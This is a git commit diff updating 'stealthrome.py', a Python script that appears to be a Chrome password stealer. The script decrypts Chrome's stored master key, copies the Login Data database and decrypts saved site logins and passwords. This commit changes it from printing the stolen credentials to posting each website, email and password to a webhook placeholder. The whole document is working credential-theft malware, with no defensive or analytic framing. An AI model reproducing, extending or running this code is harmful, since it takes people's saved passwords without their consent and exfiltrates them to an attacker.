df6bb10f6c6262bd9129de5fc4ce48fb7bd0f231
Zakariaa <88563786+lowlevel01@users.noreply.github.com>
2025-03-10 17:12:51 +0000

    Update stealthrome.py

--- stealthrome.py
+++ stealthrome.py
@@ -5,25 +5,25 @@ import win32crypt
 import shutil
 import sqlite3
 from Cryptodome.Cipher import AES
+import requests
 
-path = os.getenv('LOCALAPPDATA')+"\\Google\\Chrome\\User Data\\"
+webhook_url = "WEBHOOK_URL"
 
-local_state = open(path+"Local State","r").read()
+path = os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data\\"
+
+local_state = open(path + "Local State", "r").read()
 local_state = loads(local_state)
 
 encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
-
-decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)
-decrypted_key = decrypted_key[1]
-
-
-login_data = path+"Default\\Login Data"
+login_data = path + "Default\\Login Data"
 shutil.copy2(login_data, "login.db")
 
 conn = sqlite3.connect("login.db")
 cursor = conn.cursor()
 cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+
 for row in cursor.fetchall():
     website = row[0]
     email = row[1]
@@ -32,8 +32,14 @@ for row in cursor.fetchall():
     aes = AES.new(decrypted_key, AES.MODE_GCM, iv)
     main_encrypted = encrypted_password[15:]
     decrypted_password = aes.decrypt(main_encrypted)
-    print("Website: "+ str(website) + "---" + "Email: "+ str(email) + "---" + "Password: " + str(decrypted_password[:-16]))
 
+    data = {
+        "website": website,
+        "email": email,
+        "password": decrypted_password[:-16].decode('utf-8')  # Remove the padding and decode
+    }
 
-
-
+    response = requests.post(webhook_url, json=data)
+    
+    
+conn.close()
